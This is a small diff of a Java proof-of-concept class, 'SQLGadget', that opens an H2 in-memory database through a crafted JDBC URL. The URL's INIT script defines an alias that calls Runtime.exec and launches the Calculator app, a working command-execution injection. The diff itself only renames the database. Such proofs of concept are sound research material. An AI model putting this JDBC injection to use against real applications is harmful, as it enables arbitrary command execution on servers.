@@ -12,7 +12,7 @@ public class SQLGadget {
                 "INIT=CREATE ALIAS EXEC AS 'String shellexec(String cmd) throws java.io.IOException {Runtime.getRuntime().exec(cmd)\\;return \"trganda\"\\;}'\\;CALL EXEC ('open -a Calculator.app')";
 
         String connectionUrl =
-                "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;" + payload;
+                "jdbc:h2:mem:test;TRACE_LEVEL_SYSTEM_OUT=3;" + payload;
 
         Connection connection = DriverManager.getConnection(connectionUrl, "sa", "");
         connection.close();
